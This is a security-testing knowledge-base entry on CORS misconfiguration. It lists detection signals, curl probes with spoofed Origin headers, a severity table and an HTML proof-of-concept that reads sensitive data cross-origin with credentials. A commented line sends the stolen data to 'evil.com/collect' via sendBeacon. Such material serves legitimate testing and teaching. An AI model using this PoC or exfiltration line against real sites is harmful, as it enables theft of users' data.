---
fileClass: KB
type: pattern
tags: [pattern, cors, headers, web]
added: 2026-01-01
---

# Pattern — CORS Misconfiguration

## Summary

Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-origin access to sensitive data or actions.

## Detection Signals

- `Access-Control-Allow-Origin: *` with sensitive endpoints
- Origin reflection: server echoes back the `Origin` header verbatim
- `Access-Control-Allow-Credentials: true` with reflected/wildcard origin
- Subdomain matching: `evil.target.com` accepted as trusted origin
- Null origin accepted: `Origin: null` gets `Access-Control-Allow-Origin: null`

## Test Methodology

```bash
# Test origin reflection
curl -s -I -H "Origin: https://evil.com" https://target.com/api/sensitive | grep -i access-control

# Test null origin
curl -s -I -H "Origin: null" https://target.com/api/sensitive | grep -i access-control

# Test subdomain bypass
curl -s -I -H "Origin: https://evil.target.com" https://target.com/api/sensitive | grep -i access-control

# Test prefix bypass
curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api/sensitive | grep -i access-control
```

## Severity Matrix

| Configuration | With Credentials | Without Credentials |
|---|---|---|
| Origin reflected + ACAC:true | P2-P3 (data theft) | P4 |
| Wildcard + ACAC:true | Invalid (browser blocks) | N/A |
| Wildcard, no credentials | P5 (info only) | P5 |
| Null origin + ACAC:true | P3 (via sandbox iframe) | P4 |
| Subdomain accepted + ACAC:true | P3 (if subdomain takeover possible) | P4 |

## PoC Template

```html
<html>
<script>
fetch('https://target.com/api/sensitive', {
  credentials: 'include'
})
.then(r => r.json())
.then(d => {
  // Data exfiltrated cross-origin
  document.getElementById('out').textContent = JSON.stringify(d);
  // In real attack: navigator.sendBeacon('https://evil.com/collect', JSON.stringify(d));
});
</script>
<pre id="out"></pre>
</html>
```

## Related

- [[Lessons Learned]]
